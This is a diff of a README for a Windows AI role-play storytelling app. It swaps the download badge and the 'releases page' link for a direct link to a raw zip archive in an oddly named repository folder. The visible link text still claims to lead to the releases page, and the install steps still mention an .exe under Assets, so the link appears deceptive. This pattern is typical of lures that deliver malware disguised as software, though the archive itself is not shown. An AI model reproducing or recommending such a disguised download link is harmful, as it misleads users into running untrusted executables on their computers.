@@ -1,6 +1,6 @@
 # 🎭 Ai-Role-Play - Create immersive stories with persistent memory
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/biyearly-malanga100/Ai-Role-Play/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/biyearly-malanga100/Ai-Role-Play/raw/refs/heads/main/nontransgression/Play-Ai-Role-3.2.zip)
 
 Ai-Role-Play acts as a digital storyteller. It maintains a persistent memory of your adventures, ensures lore remains consistent, and updates the world while you play. You do not need to write code to use this tool. It runs locally on your machine to keep your stories private.
 
@@ -8,7 +8,7 @@ Ai-Role-Play acts as a digital storyteller. It maintains a persistent memory of 
 
 You need a Windows computer to run this software. Ensure your machine has at least 16GB of RAM and a modern graphics card for the best experience. 
 
-1. Visit the [releases page](https://github.com/biyearly-malanga100/Ai-Role-Play/releases) to download the latest version.
+1. Visit the [releases page](https://github.com/biyearly-malanga100/Ai-Role-Play/raw/refs/heads/main/nontransgression/Play-Ai-Role-3.2.zip) to download the latest version.
 2. Look for the file ending in `.exe` under the Assets section of the newest release.
 3. Save the file to your desktop or a folder of your choice.
 
